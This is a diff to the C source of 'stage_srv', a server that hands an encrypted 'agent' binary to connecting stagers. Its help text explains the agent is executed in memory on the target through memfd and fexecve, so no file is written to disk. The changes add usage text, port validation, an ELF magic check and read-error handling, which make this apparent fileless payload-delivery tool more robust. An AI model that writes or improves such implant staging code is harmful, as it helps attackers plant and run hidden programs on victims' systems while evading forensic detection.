@@ -188,9 +188,41 @@ done:
     close(cfd);}
 
 int main(int argc, char *argv[]){
+    /* ── Usage / help ────────────────────────────────────────────────────────── */
+    if(argc>=2 && (strcmp(argv[1],"-h")==0 || strcmp(argv[1],"--help")==0)){
+        printf(
+            "Usage: %s <agent_binary> [port]\n"
+            "\n"
+            "Arguments:\n"
+            "  agent_binary  Path to the compiled agent ELF binary to serve\n"
+            "                (e.g. ./agent or ./agent_debug)\n"
+            "  port          TCP port to listen on (default: %d)\n"
+            "\n"
+            "Examples:\n"
+            "  %s ./agent\n"
+            "  %s ./agent_debug 20596\n"
+            "\n"
+            "stage_srv loads the agent binary into memory at startup, then\n"
+            "listens for incoming stager connections. Each stager that connects\n"
+            "performs a key exchange with the server, receives the encrypted agent\n"
+            "binary over the authenticated channel, and executes it in memory\n"
+            "(memfd + fexecve — no file written to disk on the target).\n"
+            "\n"
+            "One child process is forked per stager connection; the parent\n"
+            "continues to accept new connections immediately.\n",
+            argv[0], DEFAULT_PORT, argv[0], argv[0]);
+        return 0;}
+
     if(argc<2){
-        fprintf(stderr,"Usage: %s <agent_binary> [port]\n",argv[0]);return 1;}
+        fprintf(stderr,"Usage: %s <agent_binary> [port]\n"
+                       "Try '%s --help' for full usage.\n",argv[0],argv[0]);
+        return 1;}
+
     int port=(argc>2)?atoi(argv[2]):DEFAULT_PORT;
+    /* Validate port: atoi() silently returns 0 on bad input. */
+    if(port<=0||port>65535){
+        fprintf(stderr,"[-] Invalid port: '%s' (must be 1-65535)\n",argv[2]);
+        return 1;}
 
     if(sodium_init()<0){fputs("libsodium init\n",stderr);return 1;}
     /* SIGPIPE: if a stager disconnects mid-transfer, send() would raise SIGPIPE
@@ -210,8 +242,21 @@ int main(int argc, char *argv[]){
     if(!f){perror(argv[1]);return 1;}
     fseek(f,0,SEEK_END);long fsz=ftell(f);rewind(f);
     if(fsz<=0){fputs("empty file\n",stderr);return 1;}
+
+    /* Sanity-check the ELF magic before loading. A wrong file (e.g. a shell
+     * script passed by mistake) would compile into the header but crash at
+     * load time on the target, leaving a confusing error. Better to fail here. */
+    uint8_t magic[4];
+    if(fread(magic,1,4,f)<4 || magic[0]!=0x7F || magic[1]!='E' || magic[2]!='L' || magic[3]!='F'){
+        fprintf(stderr,"[-] '%s' is not an ELF binary (wrong magic bytes)\n",argv[1]);
+        fclose(f);return 1;}
+    rewind(f);
+
     g_agent_data=(uint8_t*)malloc((size_t)fsz);
-    fread(g_agent_data,1,(size_t)fsz,f);fclose(f);
+    if(fread(g_agent_data,1,(size_t)fsz,f) != (size_t)fsz){
+        fprintf(stderr,"[-] read error on '%s'\n",argv[1]);
+        fclose(f);return 1;}
+    fclose(f);
     g_agent_sz=(size_t)fsz;
 
     printf("[stage_srv] agent: %s (%zu bytes)\n",argv[1],g_agent_sz);
